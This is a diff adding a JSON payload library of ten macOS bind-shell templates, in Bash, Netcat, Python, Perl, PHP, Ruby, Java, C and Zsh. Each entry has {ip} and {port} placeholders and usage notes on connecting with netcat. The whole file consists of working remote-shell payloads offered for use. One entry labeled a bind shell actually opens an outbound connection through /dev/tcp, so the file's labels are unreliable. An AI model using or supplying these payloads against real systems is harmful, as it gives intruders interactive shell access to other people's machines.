@@ -1,0 +1,84 @@
+{
+  "payloads": [
+    {
+      "os": "macOS",
+      "language": "Bash",
+      "description": "Bash bind shell using /dev/tcp for macOS compatibility.",
+      "template": "bash -i > /dev/tcp/{ip}/{port} 0<&1 2>&1",
+      "usage": "Run on target. Attacker connects using: nc {ip} {port}",
+      "tags": ["bind_tcp", "bash", "interactive", "fileless", "one-liner"]
+    },
+    {
+      "os": "macOS",
+      "language": "Netcat",
+      "description": "Netcat bind shell on macOS using -e flag (if available).",
+      "template": "nc -lvnp {port} -e /bin/bash",
+      "usage": "Attacker connects with: nc {ip} {port}",
+      "tags": ["bind_tcp", "netcat", "interactive", "simple"]
+    },
+    {
+      "os": "macOS",
+      "language": "Netcat",
+      "description": "Netcat bind shell without -e using FIFO workaround.",
+      "template": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp {port} > /tmp/f",
+      "usage": "Execute on macOS system, connect with: nc {ip} {port}",
+      "tags": ["bind_tcp", "netcat", "fifo", "bash", "fileless"]
+    },
+    {
+      "os": "macOS",
+      "language": "Python",
+      "description": "Python bind shell using socket and subprocess.",
+      "template": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind((\"{ip}\",{port}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2);subprocess.call([\"/bin/bash\"])'",
+      "usage": "Connect with netcat: nc {ip} {port}",
+      "tags": ["bind_tcp", "python", "interactive", "one-liner"]
+    },
+    {
+      "os": "macOS",
+      "language": "Perl",
+      "description": "Perl bind shell compatible with macOS using socket and exec.",
+      "template": "perl -e 'use Socket;$proto=getprotobyname(\"tcp\");socket(S,PF_INET,SOCK_STREAM,$proto);bind(S,sockaddr_in({port},inet_aton(\"{ip}\")));listen(S,SOMAXCONN);for(;accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/bash -i\");}'",
+      "usage": "Attacker connects using: nc {ip} {port}",
+      "tags": ["bind_tcp", "perl", "interactive", "fileless"]
+    },
+    {
+      "os": "macOS",
+      "language": "PHP",
+      "description": "PHP bind shell using socket functions and shell_exec.",
+      "template": "php -r '$sock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($sock,\"{ip}\",{port});socket_listen($sock,1);$client=socket_accept($sock);while(1){$cmd=socket_read($client,2048);$output=shell_exec($cmd);socket_write($client,$output,strlen($output));}'",
+      "usage": "Run with PHP CLI. Connect with: nc {ip} {port}",
+      "tags": ["bind_tcp", "php", "interactive", "script"]
+    },
+    {
+      "os": "macOS",
+      "language": "Ruby",
+      "description": "Ruby bind shell using TCPServer and IO.popen.",
+      "template": "ruby -rsocket -e 's=TCPServer.new(\"{ip}\",{port});c=s.accept;while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
+      "usage": "Connect with netcat: nc {ip} {port}",
+      "tags": ["bind_tcp", "ruby", "interactive", "script"]
+    },
+    {
+      "os": "macOS",
+      "language": "Java",
+      "description": "Java bind shell using ServerSocket and Runtime.exec for bash.",
+      "template": "public class BindShell { public static void main(String[] args) throws Exception { java.net.ServerSocket server = new java.net.ServerSocket({port}); java.net.Socket socket = server.accept(); Process p = Runtime.getRuntime().exec(\"/bin/bash\"); new Thread(() -> { try { java.io.InputStream in = socket.getInputStream(); java.io.OutputStream out = p.getOutputStream(); byte[] buf = new byte[1024]; int len; while ((len = in.read(buf)) != -1) out.write(buf, 0, len); } catch (Exception e) {} }).start(); java.io.InputStream in = p.getInputStream(); java.io.OutputStream out = socket.getOutputStream(); byte[] buf = new byte[1024]; int len; while ((len = in.read(buf)) != -1) out.write(buf, 0, len); } }",
+      "usage": "Compile and run, then connect with: nc {ip} {port}",
+      "tags": ["bind_tcp", "java", "compiled", "interactive"]
+    },
+    {
+      "os": "macOS",
+      "language": "C",
+      "description": "C bind shell for macOS using BSD sockets and execve.",
+      "template": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <netinet/in.h>\nint main() { int s = socket(AF_INET, SOCK_STREAM, 0); struct sockaddr_in serv = {0}; serv.sin_family = AF_INET; serv.sin_addr.s_addr = INADDR_ANY; serv.sin_port = htons({port}); bind(s, (struct sockaddr *)&serv, sizeof(serv)); listen(s, 0); int c = accept(s, NULL, NULL); dup2(c, 0); dup2(c, 1); dup2(c, 2); execve(\"/bin/bash\", NULL, NULL); return 0; }",
+      "usage": "Compile and run. Attacker connects using: nc {ip} {port}",
+      "tags": ["bind_tcp", "c", "compiled", "low-level", "interactive"]
+    },
+    {
+      "os": "macOS",
+      "language": "Zsh",
+      "description": "Bind shell using Zsh and /dev/tcp syntax.",
+      "template": "zsh -c 'zmodload zsh/net/tcp && ztcp -l {port} && ztcp -a 0 && zsh -i <&$REPLY >&$REPLY 2>&$REPLY'",
+      "usage": "Run on target, connect using nc {ip} {port}",
+      "tags": ["bind_tcp", "zsh", "interactive", "shell", "fileless"]
+    }
+  ]
+}
